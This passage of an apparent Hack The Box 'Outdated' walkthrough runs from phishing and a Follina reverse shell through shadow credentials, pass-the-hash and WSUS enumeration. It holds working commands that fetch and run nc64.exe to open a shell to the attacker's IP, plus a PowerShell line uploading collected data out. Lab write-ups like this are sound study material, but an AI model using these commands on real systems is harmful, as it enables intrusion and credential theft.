<li>This may be valid attack path as we know that <code>itsupport</code> is expecting to be sent links.</li>
</ul>
</li>
</ul>
<h5 id="microsoft-support-diagnostic-tool--msdt--overview">Microsoft Support Diagnostic Tool (MSDT) Overview:</h5>
<ul>
<li>
<p><strong>Purpose</strong>:</p>
<ul>
<li><code>MSDT</code> is a built-in Windows tool designed to help users troubleshoot and diagnose system problems.</li>
<li>It collects diagnostic information (logs, configurations, etc.) about a system and sends it to Microsoft Support or can be used to automatically resolve issues based on predefined fixes.</li>
</ul>
</li>
<li>
<p><strong>Functionality</strong>:</p>
<ul>
<li>It works through various troubleshooting packs, which are scripts or tools that identify and resolve specific issues (e.g., network connectivity, hardware problems).</li>
<li>Often accessed via Windows troubleshooting settings or invoked by support agents when collecting system data remotely.</li>
</ul>
</li>
<li>
<p><strong>How it’s triggered</strong>:</p>
<ul>
<li>Can be invoked manually by users or automatically through specific command-line arguments.</li>
<li>In the case of the Follina exploit, it was invoked through a URL protocol (e.g., <code>ms-msdt:</code>) embedded in a malicious Office document.</li>
</ul>
</li>
</ul>
<h3 id="testing-if-we-can-make-itsupport-click-an-emailed-link-using-swaks">Testing if we can make <code>itsupport</code> click an emailed link using <code>swaks</code>:</h3>
<ul>
<li>
<p><strong>I use swaks to send an email to the</strong> <code>itsupport@outdated.htb</code>:</p>
<ul>
<li><code>swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body &quot;http://10.10.14.43/&quot; --header &quot;Subject: Testing&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-150005_.png">
</figure>
</li>
<li>I put the IP of my attack box as a link within the body and setup a listener on host.
<ul>
<li><code>nc -nvlp 80</code></li>
</ul>
</li>
<li>I do this as I want to see if we send a link will it be clicked.</li>
</ul>
</li>
<li>
<p><strong>I get a connection back to my listener once the email is sent</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-145936_.png">
</figure>
</li>
<li>This verified that if a link is sent to that email address the link will be clicked.</li>
</ul>
</li>
</ul>
<h3 id="trying-to-get-a-reverse-shell-using-the-follina-exploit">Trying to get a reverse shell using the <code>Follina</code> exploit:</h3>
<ul>
<li>This section includes all my troubleshooting when I couldn&rsquo;t get things started/moving forward. I want to leave this in as a lot of walkthroughs&rsquo; are like, so I did A, B, C and that&rsquo;s how I got root. Where as it&rsquo;s never that simple, for me at least, and leads to unrealistic expectations for people just trying to get into the industry/CTF&rsquo;s. So I leave almost everything in, bones and all.</li>
</ul>
<h4 id="trying-to-get-a-reverse-shell-using-follina-and-a-malicious-dot-doc">Trying to get a reverse shell using <code>Follina</code> and a malicious <code>.doc</code>:</h4>
<ul>
<li>
<p><strong>I download john-hammonds follina POC</strong>:</p>
<ul>
<li><a href="https://github.com/JohnHammond/msdt-follina?tab=readme-ov-file">https://github.com/JohnHammond/msdt-follina?tab=readme-ov-file</a></li>
</ul>
</li>
<li>
<p><strong>Create a base64 encoded reverse shell using</strong> <a href="https://revshells.com">https://revshells.com</a>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-155640_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Run the exploit generator &amp; passing in my base64 encoded string</strong>:</p>
<ul>
<li><code>python3 follina.py -i tun0 -p 9999  -c &quot;powershell -e &lt;base64EncodedString&gt;&quot;</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-155503_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>The exploit by default starts the listener too to serve the malicious</strong> <code>.html</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-155708_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I start my listener on</strong> <code>443</code>:</p>
<ul>
<li><code>nc -nvlp 443</code></li>
</ul>
</li>
<li>
<p><strong>I use swaks to send the malicious document</strong>:</p>
<ul>
<li><code>swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body &quot;http://10.10.14.43/&quot; --header &quot;Subject: Testing&quot; --attach follina.doc</code></li>
<li><figure><img src="/ox-hugo/2024-10-10-155753_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>And I get…..nothing</strong>:</p>
<ul>
<li>Lets get thinking…..</li>
</ul>
</li>
</ul>
<h4 id="trying-to-get-a-reverse-shell-using-follina-malicious-html">Trying to get a reverse shell using <code>Follina</code> malicious <code>html</code>:</h4>
<ul>
<li>With the <code>Follina</code> exploit the <code>.doc/.rtf</code> is just a mechanism to have the victim reach out to the malicious <code>html</code> which actually has the payload. As we know that if we send a link to the <code>itsupport</code> it will be clicked. Which means we should be able to send them a direct link to the malicious <code>follina</code> <code>html</code>, it be clicked and the payload delivered.</li>
</ul>
<h5 id="using-john-hammond-s-follina-exploit-web-server-to-serve-the-payload">Using John Hammond&rsquo;s <code>Follina</code> exploit web-server to serve the payload:</h5>
<ul>
<li>
<p><strong>I double check that the html is working by running curl</strong>:</p>
<ul>
<li><code>curl http://10.10.14.43:9999</code></li>
<li>We can see it is here so we know it is running:</li>
<li><figure><img src="/ox-hugo/2024-10-10-160414_.png">
</figure>

<ul>
<li>If you&rsquo;re wondering why it&rsquo;s so much data, the exploit requires 4096 bytes of padding to be included before the exploit will trigger.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Checking the server we can see the request</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-160601_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I put the</strong> <code>nc64.exe</code> <strong>in the same folder and modify my command</strong>:</p>
<ul>
<li><code>python3 follina.py -i tun0 -p 9999  -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\Windows\Temp\nc64.exe; C:\Windows\Temp\nc64.exe -e cmd.exe 10.10.14.43 443</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-071239_.png">
</figure>
</li>
<li>What&rsquo;s strange is I can get it trigger the part where it reaches out to the webserver, but it never actually pulls down the <code>nc64.exe</code> binary however, it just reaches out to the server.</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li><strong>Back to the drawing board….</strong>
<ul>
<li>I mean I could debug this but there are other publicly available exploits so will try one of them first.</li>
</ul>
</li>
</ul>
<h3 id="getting-a-reverse-shell-using-follina-dot-py">Getting a Reverse shell using <code>Follina.py</code>:</h3>
<ul>
<li>
<p><strong>I find this exploit</strong>:</p>
<ul>
<li><a href="https://github.com/chvancooten/follina.py">https://github.com/chvancooten/follina.py</a></li>
</ul>
</li>
<li>
<p><strong>I copy the</strong> <code>nc64.exe</code> <strong>binary to it&rsquo;s root web folder</strong> <code>/www</code>:</p>
</li>
<li>
<p><strong>Start the webserver &amp; put my command I want to run when the victim reaches the malicious</strong> <code>html</code>:</p>
<ul>
<li><code>python follina.py -t rtf -m command -c 'Invoke-WebRequest http://10.10.14.43/nc64.exe -OutFile C:\\Windows\\Temp\\nc64.exe; C:\\Windows\\Temp\\nc64.exe -e cmd.exe 10.10.14.43 443'</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-074938_.png">
</figure>
</li>
<li>+Note+: With this particular exploit the author does to use double backslashes to escape them.</li>
</ul>
</li>
<li>
<p><strong>Send my email via</strong> <code>swaks</code>:</p>
<ul>
<li><code>swaks --to itsupport@outdated.htb --from bloodstiller@bloodstiller.com --server mail.outdated.htb --body &quot;Here is the web app - http://10.10.14.43/exploit.html&quot; --header &quot;Subject: Web&quot;</code></li>
</ul>
</li>
<li>
<p><strong>We immediately get a hit on the web server</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-075043_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>We catch our shell Caught</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-075203_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="enumerating-as-the-user-btables">Enumerating as the user <code>btables</code>:</h3>
<h4 id="checking-if-printspoofer-is-a-viable-exploit-path">Checking if <code>PrintSpoofer</code> is a viable exploit path:</h4>
<ul>
<li>
<p><strong>As we saw that</strong> <code>PrintSpooler/PrintSpoofer</code> <strong>was mentioned the first thing to check is the privileges of our user</strong>:</p>
<ul>
<li>To perform this attack we need either <code>SeAssignPrimaryTokenPrivilege</code> or <code>SeImpersonatePrivilege</code> we have neither.</li>
<li><figure><img src="/ox-hugo/2024-10-11-101536_.png">
</figure>
</li>
<li>Maybe we can activate them with <a href="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77">EnableAllTokePrivs.ps1</a></li>
</ul>
</li>
<li>
<p><strong>I transer</strong> <a href="https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77">EnableAllTokePrivs.ps1</a>:</p>
<ul>
<li><code>powershell -c wget http://10.10.14.43:9000/EnableAllTokenPrivs.ps1 -o tp.ps1</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-101954_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run it</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-102126_.png">
</figure>
</li>
<li>No luck:</li>
<li><figure><img src="/ox-hugo/2024-10-11-102149_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="finding-a-check-mail-dot-ps1-script-containing-clear-text-creds">Finding a <code>check_mail.ps1</code> script containing clear text creds:</h4>
<ul>
<li>
<p><strong>I discover a script called</strong> <code>check_mail.ps1</code> <strong>in the users home folder</strong>::</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-183411_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>Reading the contents of the script reveals a new username and a clear-text password</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-10-190326_.png">
</figure>
</li>
<li>I add the username and password to my list:</li>
</ul>
</li>
<li>
<p><strong>I check if the username &amp; password can be used to access SMB or LDAP but they cannot</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-094845_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h4 id="reading-emails-using-check-mail-dot-ps1">Reading Emails using <code>check_mail.ps1</code>:</h4>
<ul>
<li><strong>I run the</strong> <code>check_mail.ps1</code> <strong>script</strong>:
<ul>
<li><code>powershell -c .\.check_mail.ps1</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-095038_.png">
</figure>
</li>
<li>I have a feeling this is just the automated mechanism to read the email we sent.</li>
</ul>
</li>
</ul>
<h4 id="trying-to-extract-credentials-using-lazagne-dot-exe">Trying to Extract Credentials using <a href="https://github.com/AlessandroZ/LaZagne">LaZagne.exe</a>:</h4>
<ul>
<li><strong>I transer</strong> <code>LaZagne.exe</code> <strong>over to hunt for passwords</strong>:
<ul>
<li><code>curl http://10.10.14.43:9000/LaZagne.exe -o lz.exe</code></li>
<li>I get a big fat nothing:
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-095943_.png">
</figure>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="using-sharphound-dot-exe-to-enumerate-the-environment-dot">Using <code>SharpHound.exe</code> to enumerate the environment.</h3>
<ul>
<li>
<p><strong>I transfer the binary accross</strong>:</p>
<ul>
<li><code>powershell -c wget http://10.10.14.43:9000/SharpHound.exe -o sh.exe</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-102411_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run the collector</strong>:</p>
<ul>
<li><code>.\sh.exe</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-102440_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="transferring-the-sharphound-zip-back-to-myself-using-my-custom-python-webserver">Transferring the <code>SharpHound</code> Zip back to myself using my custom python webserver:</h3>
<ol>
<li>
<p><strong>Start my custom python webserver</strong>:</p>
<ul>
<li>I have this handy python webserver that is useful when exfiling data.
<ul>
<li>You can find it here: <a href="https://github.com/bloodstiller/bloodserver">https://github.com/bloodstiller/bloodserver</a></li>
<li>Save as <code>bloodserver.py</code></li>
<li>Run <code>python3 bloodserver.py -u bloodstiller --password bl00dst1ll3r -p 9999 --https</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-114129_.png">
</figure>
</li>
</ul>
</li>
<li>+NOTE+:
<ul>
<li>Will output file as <code>uploaded_file</code></li>
<li>FYI my server has certs and you can enter in passwords &amp; usernames or it will auto-generate one for you.</li>
<li>The only reason I am not using <code>443</code> for https is because my revers-shell is running over that.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>Send the file from victim using</strong> <code>powershell</code>:</p>







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; $wc.Headers.Add(<span style="color:#e6db74">&#34;Authorization&#34;</span>, <span style="color:#e6db74">&#34;Basic &#34;</span> + [<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#34;bloodstiller:bl00dst1ll3r&#34;</span>))); <span style="color:#66d9ef">try</span> { $response = $wc.UploadData(<span style="color:#e6db74">&#34;https://10.10.14.43:9999&#34;</span>, [<span style="color:#66d9ef">System.IO.File</span>]::ReadAllBytes(<span style="color:#e6db74">&#34;C:\Users\btables\20241011102426_BloodHound.zip&#34;</span>)); Write-Host <span style="color:#e6db74">&#34;Server response: </span>$([<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8.GetString($response))<span style="color:#e6db74">&#34;</span>; Write-Host <span style="color:#e6db74">&#34;File sent successfully!&#34;</span> } <span style="color:#66d9ef">catch</span> { Write-Host <span style="color:#e6db74">&#34;An error occurred: </span>$_<span style="color:#e6db74">&#34;</span> }</span></span></code></pre></div>
    
</div>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-113819_.png">
</figure>
</li>
<li><strong>File received on our attack host</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-113854_.png">
</figure>
</li>
<li>+Note+: The file will be called <code>uploaded_file</code> you will have to change it back to a  <code>zip</code> file.</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="3-dot-lateral-movement">3. Lateral Movement:</h2>
<h3 id="discovering-btables-has-addkeycredentiallink-privilege-over-sflowers">Discovering <code>btables</code> has <code>AddKeyCredentialLink</code> privilege over <code>sflowers</code>:</h3>
<ul>
<li>
<p>After ingesting the data into bloodhound we can see that <code>btables</code> has the <code>AddKeyCredentialLink</code> privilege over <code>sflowers</code>.</p>
</li>
<li>
<figure><img src="/ox-hugo/2024-10-11-120229_.png">
</figure>

</li>
<li>
<p><strong>We can perform a shadow credentials attack to take advantage of this privilege</strong>:</p>
<ul>
<li>If you are unfamiliar with this attack vector I have a write up here:
<ul>
<li><a href="https://bloodstiller.com/articles/shadowcredentialsattack/">https://bloodstiller.com/articles/shadowcredentialsattack/</a></li>
</ul>
</li>
<li>To put it simply: If we have the <code>WriteProperty</code> privilege (specifically for the <code>msDS-KeyCredentialLink</code> attribute) over a user or computer object, we can set Shadow Credentials for that object and authenticate as them. You read that right, we can add a certificate-based credential to a user or computer and then authenticate as them. We can also request a Kerberos ticket and use it for pass-the-ticket attacks if needed.</li>
</ul>
</li>
</ul>
<h3 id="building-whisker-dot-exe">Building <code>whisker.exe</code>:</h3>
<ul>
<li><strong>I actually don&rsquo;t the binary in my folder of binaries so will have to build</strong>:
<ul>
<li>I open up my windows VM.</li>
<li>Clone the repo.
<ul>
<li><code>git clone https://github.com/eladshamir/Whisker</code></li>
</ul>
</li>
<li>Open up Visual <code>Studio 2022</code>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-140328_.png">
</figure>
</li>
</ul>
</li>
<li>Build &amp; voila a nice new <code>whisker.exe</code> binary.</li>
</ul>
</li>
</ul>
<h3 id="adding-shadow-credentials-to-sflowers-using-whisker-dot-exe">Adding Shadow Credentials to <code>sflowers</code> using <code>whisker.exe</code> :</h3>
<ul>
<li>
<p><strong>I transfer</strong> <code>whisker.exe</code> <strong>to the host</strong>:</p>
<ul>
<li><code>curl http://10.10.14.43:9000/Whisker.exe -o w.exe</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-163701_.png">
</figure>
</li>
<li>I call it <code>w.exe</code> for no reason other than speed when typing.</li>
</ul>
</li>
<li>
<p><strong>I set the shadow credentials on the user</strong> <code>sflowers</code>:</p>
<ul>
<li><code>w.exe add /target:sflowers /domain:outdated.htb</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-141932_.png">
</figure>
</li>
<li>+Note+: What is great about <code>whisker</code> is that spits out the exact command you will need to run in <code>rubeus</code>.</li>
</ul>
</li>
</ul>
<h3 id="i-use-the-base64-encoded-certificate-to-request-a-tgt-for-sflowers-using-rubeus">I use the base64 encoded certificate to request a <code>TGT</code> for <code>sflowers</code> using rubeus:</h3>
<ul>
<li>
<p><strong>I run rubeus and pass it the base64 encoded certificate &amp; password</strong>:</p>
<ul>
<li><code>r.exe asktgt /user:sflowers /certificate:&lt;base64Cert&gt; /password:&quot;sA1JSl1rVtabQdMp&quot; /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show</code></li>
</ul>
</li>
<li>
<p><strong>Rubeus Command Explained</strong>:</p>
<ul>
<li>Uses the certificate to request a Kerberos TGT for Susan Flowers (sflowers)</li>
<li>The <code>/certificate</code> parameter contains the Base64-encoded certificate</li>
<li>The <code>/password</code> is for the private key, not Susan&rsquo;s actual AD password</li>
<li>The <code>/getcredentials</code> flag attempts to decrypt the encrypted NTLM hash from the TGT</li>
<li>The <code>/show</code> flag displays the ticket details and other information</li>
<li>If successful, Rubeus receives a TGT and can extract the NTLM hash</li>
</ul>
</li>
<li>
<p><strong>As a result of this process</strong>:</p>
<ul>
<li>Rubeus obtains a TGT for Susan Flowers (sflowers) &amp; generates a <code>.kirbi</code> file which can be used for pass-the-ticket attacks.
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-142105_.png">
</figure>
</li>
</ul>
</li>
<li>It also extracts and displays the user&rsquo;s NTLM hash (due to the <code>/getcredentials</code> flag)
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-142111_.png">
</figure>
</li>
</ul>
</li>
<li>The ticket details and other information are shown in the output (due to the <code>/show</code> flag)</li>
</ul>
</li>
<li>
<p><strong>I check the</strong> <code>NTLM</code> <strong>hash is valid using</strong> <code>netexec</code>:</p>
<ul>
<li><code>netexec smb $box -u $user -H $hash --share</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-165050_.png">
</figure>
</li>
<li>We can see we have read &amp; write access to the <code>WSUS</code> shares now.</li>
<li>+Note+: I actually had to restart the box as I was getting some strange errors when trying to authenticate to SMB as <code>sflowers</code></li>
</ul>
</li>
</ul>
<h3 id="enumerating-the-host-as-slfowers">Enumerating the Host as <code>slfowers</code>:</h3>
<ul>
<li>
<p><strong>I connect with</strong> <code>evil-winrm</code>:</p>
<ul>
<li><code>evil-winrm -i $box -u $user -H $hash</code></li>
</ul>
</li>
<li>
<p><strong>Get the flag</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-143311_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I see that</strong> <code>PsExec64.exe</code> <strong>binary is also on the desktop</strong>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-165303_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h3 id="seeing-sflowers-has-outbound-object-control-over-the-ca">Seeing <code>sflowers</code> has outbound object control over the <code>CA</code>:</h3>
<ul>
<li>
<p><strong>I see in bloodhound that sflowers has outbound object control over the</strong> <code>CA</code>:</p>
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-144117_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>I run</strong> <code>certipy-ad</code> <strong>to see if there are any vulnerable certs</strong>:</p>
<ul>
<li><code>certipy-ad find -vulnerable -enabled -u $user@$domain -hashes :$hash -dc-ip $box</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-144001_.png">
</figure>
</li>
<li>I check but there are no vulnerable certs</li>
</ul>
</li>
</ul>
<h3 id="discovering-sflowers-is-part-of-the-wsus-administrators-group">Discovering <code>sflowers</code> is part of the wsus administrators group:</h3>
<ul>
<li><strong>Looking at</strong> <code>sflowers</code> <strong>group memberships we can see she is part of the</strong> <code>wsus administrators</code> <strong>group</strong>:
<ul>
<li><figure><img src="/ox-hugo/2024-10-11-201058_.png">
</figure>
</li>
<li>This could be a viable attack path as if we can push a malicious update via <code>wsus</code> we may be able to escalate our privileges:</li>
</ul>
</li>
</ul>
<h3 id="what-is-wsus--windows-server-update-services">What is <code>WSUS</code> (Windows Server Update Services)?</h3>
<ul>
<li>WSUS (Windows Server Update Services) is a critical component in many corporate Windows environments. It allows administrators to manage and distribute updates centrally.</li>
</ul>
<h4 id="wsus-architecture">WSUS Architecture:</h4>
<ul>
<li>
<p><strong>Typical deployment</strong>:</p>
<ul>
<li>One WSUS server in the corporate network</li>
<li>Downloads patches from Microsoft via <code>HTTP/HTTPS</code></li>
<li>Deploys patches to clients as they check in</li>
<li>Client communication:
<ul>
<li><code>HTTP</code> (port 8530)</li>
<li><code>HTTPS</code> (port 8531)</li>
</ul>
</li>
<li><figure><img src="/ox-hugo/2024-10-11-181805_.png">
</figure>
</li>
</ul>
</li>
<li>
<p><strong>More complex deployments may involve</strong>:</p>
<ul>
<li>Upstream server: Connects to Microsoft, downloads updates</li>
<li>Downstream servers: Receive updates from upstream, distribute to clients</li>
<li><figure><img src="/ox-hugo/2024-10-11-181911_.png">
</figure>
</li>
</ul>
</li>
</ul>
<h2 id="4-dot-privilege-escalation">4. Privilege Escalation:</h2>
<h3 id="manually-enumerating-the-wsus-service-by-querying-the-registry">Manually Enumerating the <code>WSUS</code> Service by querying the registry:</h3>
<h4 id="enumerating-the-primary-wsus-settings">Enumerating the Primary WSUS Settings:</h4>
<ul>
<li><strong>To query the main WSUS settings, use the following command</strong>:
<ul>
<li><code>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-200931_.png">
</figure>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="#ZgotmplZ">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
</span></span><span style="display:flex;"><span>    SetActiveHours    REG_DWORD     0x1
</span></span><span style="display:flex;"><span>    ActiveHoursStart    REG_DWORD     0x0
</span></span><span style="display:flex;"><span>    ActiveHoursEnd    REG_DWORD     0x17
</span></span><span style="display:flex;"><span>    AcceptTrustedPublisherCerts    REG_DWORD     0x1
</span></span><span style="display:flex;"><span>    ExcludeWUDriversInQualityUpdate    REG_DWORD     0x1
</span></span><span style="display:flex;"><span>    DoNotConnectToWindowsUpdateInternetLocations    REG_DWORD     0x1
</span></span><span style="display:flex;"><span>    WUServer    REG_SZ     http<span style="color:#960050;background-color:#1e0010">:</span>//wsus.outdated.htb<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8530</span>
</span></span><span style="display:flex;"><span>    WUStatusServer    REG_SZ     http<span style="color:#960050;background-color:#1e0010">:</span>//wsus.outdated.htb<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8530</span>
</span></span><span style="display:flex;"><span>    UpdateServiceUrlAlternate    REG_SZ</span></span></code></pre></div>
    
</div>
<ul>
<li><strong>Key Findings</strong>:
<ul>
<li>
<p><code>SetActiveHours</code>:</p>
<ul>
<li><code>ActiveHoursStart</code> Start = 0x0 (12:00 AM)</li>
<li><code>ActiveHoursEnd</code> End = 0x17 (11:00 PM)</li>
<li>Updates are allowed to install at any time</li>
</ul>
</li>
<li>
<p><code>AcceptTrustedPublisherCerts = 1</code></p>
<ul>
<li>The system accepts certificates from trusted publishers for updates</li>
</ul>
</li>
<li>
<p><code>DoNotConnectToWindowsUpdateInternetLocations = 1</code></p>
<ul>
<li>The system is configured to not connect directly to Windows Update</li>
<li>All updates must come through the WSUS server</li>
</ul>
</li>
<li>
<p><code>WSUSServer</code>:</p>
<ul>
<li><a href="http://wsus.outdated.htb:8530">http://wsus.outdated.htb:8530</a></li>
<li>This is the central update server for the organization</li>
<li><strong>Connection Security: HTTP (unencrypted)</strong>:
<ul>
<li>The connection to the WSUS server uses HTTP instead of HTTPS
<ul>
<li>Seen in the url  <a href="http://wsus.outdated.htb:8530">http://wsus.outdated.htb:8530</a> &amp; that it&rsquo;s using port 8530</li>
</ul>
</li>
<li>This could potentially expose update traffic to interception</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="enumerating-the-automatic-update-settings">Enumerating the Automatic Update Settings:</h4>
<ul>
<li><strong>To query specific automatic update settings</strong>:
<ul>
<li><code>reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU</code></li>
<li><figure><img src="/ox-hugo/2024-10-11-200951_.png">
</figure>
</li>
</ul>
</li>
</ul>
<!-- raw HTML omitted -->







<div class="codeblock">
    
        <div class="copy-button-box">
            <button class="copy-button" state="copy" data="HKEY_LOCAL_MACHINE%5cSoftware%5cPolicies%5cMicrosoft%5cWindows%5cWindowsUpdate%5cAU%0a%20%20%20%20AutoInstallMinorUpdates%20%20%20%20REG_DWORD%20%20%20%20%200x1%0a%20%20%20%20NoAutoUpdate%20%20%20%20REG_DWORD%20%20%20%20%200x0%0a%20%20%20%20AUOptions%20%20%20%20REG_DWORD%20%20%20%20%200x3%0a%20%20%20%20ScheduledInstallDay%20%20%20%20REG_DWORD%20%20%20%20%200x0%0a%20%20%20%20ScheduledInstallTime%20%20%20%20REG_DWORD%20%20%20%20%200x3%0a%20%20%20%20ScheduledInstallEveryWeek%20%20%20%20REG_DWORD%20%20%20%20%200x1%0a%20%20%20%20UseWUServer%20%20%20%20REG_DWORD%20%20%20%20%200x1">
                <i class="bi bi-copy"></i>
            </button>
        </div>
    

    
        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
</span></span><span style="display:flex;"><span>    AutoInstallMinorUpdates    REG_DWORD     0x1
</span></span><span style="display:flex;"><span>    NoAutoUpdate    REG_DWORD     0x0
</span></span><span style="display:flex;"><span>    AUOptions    REG_DWORD     0x3
</span></span><span style="display:flex;"><span>    ScheduledInstallDay    REG_DWORD     0x0
</span></span><span style="display:flex;"><span>    ScheduledInstallTime    REG_DWORD     0x3
</span></span><span style="display:flex;"><span>    ScheduledInstallEveryWeek    REG_DWORD     0x1
</span></span><span style="display:flex;"><span>    UseWUServer    REG_DWORD     0x1</span></span></code></pre></div>
    
</div>
<ul>
<li><strong>Key Findings</strong>:
<ul>
<li>
<p><code>AutoInstallMinorUpdates = 1</code></p>
<ul>
<li>Minor Updates: Auto-install</li>
<li>Small updates are installed without user intervention</li>
</ul>
</li>
<li>
<p><code>NoAutoUpdate = 0</code></p>
<ul>
<li>Automatic Updates: Enabled</li>
<li>The system will automatically check for and download updates</li>
</ul>
</li>
<li>
<p><code>AUOptions = 3</code></p>
<ul>
<li>Update Installation: Automatic:</li>
<li>Updates will be downloaded and installed automatically</li>
</ul>
</li>
<li>
<p><code>ScheduledInstallEveryWeek = 1</code></p>
<ul>
<li>Update Schedule:
<ul>
<li>Day: 0 (Every day)</li>
<li>Time: 3 (3:00 AM)</li>
<li>Frequency: Weekly</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>UseWUServer = 1</code></p>
<ul>
<li>Update Source: WSUS Server</li>
<li>Confirms that the system is using the configured WSUS server</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="analysis-and-implications-of-the-results">Analysis and Implications of the results:</h4>
<ul>
<li>
<p><strong>Security Concerns</strong>: The use of an unencrypted HTTP connection to the WSUS server could pose a security risk, potentially allowing for man-in-the-middle attacks.</p>
<ul>
<li>E.G. Us right now.</li>
</ul>
</li>
<li>
<p><strong>Automatic Update Behavior</strong>: The system is set to automatically install updates, which helps maintain system security but also means if we push an update it will be automatically installed!</p>
</li>
<li>
<p><strong>Update Control</strong>: The system is fully reliant on the WSUS server for updates, as it&rsquo;s configured not to connect to Windows Update directly.</p>
</li>
<li>
<p><strong>Scheduled Updates</strong>: Updates are scheduled to install weekly <code>ScheduledInstallEveryWeek = 1</code>, which suggests a regular maintenance window.</p>
</li>
<li>
<p><strong>Attack Path</strong>:</p>
<ul>
<li>I will attempt to push a malicious update using the tool <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a></li>
</ul>
</li>
</ul>
<h3 id="using-sharpwsus-to-push-a-malicious-update">Using <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a> to push a malicious update:</h3>
<h4 id="building-sharpwsus">Building <a href="https://github.com/nettitude/SharpWSUS">SharpWSUS</a>:</h4>
<ul>
<li><strong>Again I don&rsquo;t have a sharpWSUS binary in my common binaries so will have to build it</strong>:
<ul>
<li>I open up my windows VM.</li>
